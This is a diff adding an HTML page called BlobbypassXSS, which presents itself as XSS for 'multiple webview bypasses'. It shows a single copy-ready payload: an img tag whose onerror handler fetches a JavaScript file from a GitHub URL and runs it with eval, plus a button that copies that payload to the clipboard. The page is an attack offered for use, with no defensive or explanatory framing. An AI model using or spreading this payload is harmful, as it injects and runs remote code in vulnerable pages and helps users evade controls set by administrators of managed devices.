@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlobbypassXSS</title>
+    <style>
+        button {
+            margin-top: 10px;
+            padding: 10px 15px;
+            font-size: 16px;
+            cursor: pointer;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>BlobbypassXSS</h1>
+    <h2>Some XSS that can be used for multiple webview bypasses.</h2>
+    
+    <pre>
+        <code id="xssCode">
+            &lt;img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=&gt;r.text()).then(c=&gt;eval(c))'&gt;
+        </code>
+    </pre>
+    
+    <button onclick="copyToClipboard()">Copy</button>
+
+
+    <script>
+        function copyToClipboard() {
+            const codeElement = document.getElementById('xssCode');
+            const range = document.createRange();
+            range.selectNode(codeElement);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            try {
+                document.execCommand('copy');
+            } catch (err) {
+                // Handle errors here if needed
+            }
+            window.getSelection().removeAllRanges();
+        }
+    </script>
+</body>
+</html>
